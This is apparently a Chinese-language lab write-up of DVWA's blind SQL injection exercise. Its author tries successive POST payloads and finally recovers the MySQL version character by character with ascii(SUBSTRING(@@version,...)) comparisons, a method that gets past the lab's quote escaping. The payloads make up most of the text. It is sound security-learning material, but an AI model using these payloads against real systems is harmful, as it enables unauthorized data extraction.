# SQL Injection (Blind)

> Objective:
Find the version of the SQL database software through a blind SQL attack.
>

> Objective:
Find the version of the SQL database software through a blind SQL attack.
>

### 觀察
這關也是改用 POST
先透過上一關驗證一下 VERSION 語法

```sql
id=1 UNION select 1,VERSION(); &Submit=Submit
```
```sql
id=1 UNION SELECT 1,SUBSTRING((SELECT @@version),1,20); &Submit=Submit
```
```sql
SELECT 1,SUBSTRING((SELECT @@version),1,20);
```

```sql
SELECT SUBSTRING((SELECT @@version),1,20);
```

```sql
(SELECT SUBSTRING((SELECT @@version),1,20) like '10.1.26%');
```

```sql
id=1 AND (SELECT SUBSTRING((SELECT @@version),1,20)); &Submit=Submit
```

### 參考之前已經得知的版本

```jsx
10.1.26-MariaDB-0+de
```

false

```sql
1 AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.1.26%')
```

只能多嘗試，後來發現可能是單引號的問題，看起來是因為 POST data 的關係，payload 被視為字串，先換成 `=` 來測試

```sql
(SELECT SUBSTRING((SELECT @@version),1,1)) = 1
```

true (`User ID exists in the database.`)

```sql
id=1 AND (SELECT SUBSTRING((SELECT @@version),1,1)) = 1 &Submit=Submit
```

true (`User ID exists in the database.`)

```sql
id=1 AND (SELECT SUBSTRING((SELECT @@version),1,2)) = 10 &Submit=Submit
```

false

```sql
id=1 AND (SELECT SUBSTRING((SELECT @@version),1,2)) = 12 &Submit=Submit
```

...

理論上應該是可以猜出 DB 的本版

```sql
id=1 AND (SELECT SUBSTRING((SELECT @@version),1,3)) = 10.);&Submit=Submit
```

### 卡關 QQ

### 卡關 QQ

但如果再增加下去 10.x.x 的判斷會無效，崩潰

換個環境再測 db 是 `5.7.34` ，也是第二個小數點之後無法正常判斷，頂多只能判斷到 5.7

看提示說這關有使用 `mysql_real_escape_string()` ，會將 \x00, \n, \r, \, ', ", \x1a 跳脫

```sql
id=1 AND (SELECT SUBSTRING((SELECT @@version),1,5)) = 10.10&Submit=Submit
```

```sql
id=1 AND (SELECT @@version) like 10.1.26-MariaDB-0+de&Submit=Submit
```

```sql
id=1 AND SELECT (SELECT @@version)) = 5.7.34&Submit=Submit
```

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/ffffd1c6-c73a-4723-9dba-eda574016665/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220216%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220216T162046Z&X-Amz-Expires=86400&X-Amz-Signature=996d44a6b6eb9f6ff039d065ca28e6c15f2dae3bc3edbef07c9a1fb524da51da&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

---

# Update - February 21, 2022

```sql
SELECT 1, (SELECT (version())) <> 0;
```

```sql
id=1 AND (SELECT version() <> 0); &Submit=Submit
# User ID exists in the database
```

```sql
id=1 AND (SELECT version() = 5.7); &Submit=Submit
# User ID exists in the database
```

```sql
id=1 AND (SELECT version() = '5.7.34'); &Submit=Submit
# User ID is MISSING in the database
```

也是無法完整猜測

### Done

因此參考別人的 writeup 後才知道可以用 `ascii` 將字串轉換成數字，這樣就可以不用擔心單引號被過濾了，基本上這邊只要能轉換成數字型態就可以了

```sql
SELECT SUBSTRING((SELECT @@version),1,6)
# 5.7.34
```

5

```sql
SELECT 1=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),1,1)) = 53); &Submit=Submit
# User ID is MISSING in the database
```

SUBSTRING((SELECT @@version),2,1) 代表第2個字串的值

```sql
select SUBSTRING((SELECT @@version),2,1);
# .
```

.

```sql
id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),2,1)) = 46); &Submit=Submit
# User ID exists in the database
```

7

```sql
id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),3,1)) = 55); &Submit=Submit
# User ID exists in the database
```

.

```sql
id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),4,1)) = 46); &Submit=Submit
# User ID exists in the database
```

3

```sql
id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),5,1)) = 51); &Submit=Submit
# User ID exists in the database
```

.

```sql
id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),6,1)) = 46); &Submit=Submit
# User ID is MISSING in the database
```

4

```sql
id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),6,1)) = 52); &Submit=Submit
# User ID exists in the database
```

從上面嘗試的結果就可以推敲出版本

```
5.7.34
```

---
# Ref

- DVWA 通关指南：SQL Injection-Blind(SQL 盲注) - 乌漆WhiteMoon - 博客园
[https://www.cnblogs.com/linfangnan/p/13694057.html](https://www.cnblogs.com/linfangnan/p/13694057.html)

- SQL CAST and SQL CONVERT function overview
[https://www.sqlshack.com/overview-of-the-sql-cast-and-sql-convert-functions-in-sql-server/](https://www.sqlshack.com/overview-of-the-sql-cast-and-sql-convert-functions-in-sql-server/)
